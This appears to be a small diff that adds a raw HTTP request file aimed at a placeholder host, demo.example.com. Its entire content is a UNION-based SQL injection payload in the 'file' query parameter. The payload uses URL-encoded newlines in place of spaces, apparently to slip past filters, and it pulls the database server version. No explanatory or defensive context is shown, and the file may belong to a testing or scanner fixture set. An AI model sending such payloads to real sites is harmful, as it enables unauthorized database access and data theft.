@@ -1,0 +1,4 @@
+GET /a?file=1%0aunion%0aall%0aselect%0anull,(select%0a@@version),null HTTP/1.1
+Host: demo.example.com
+Connection: close
+
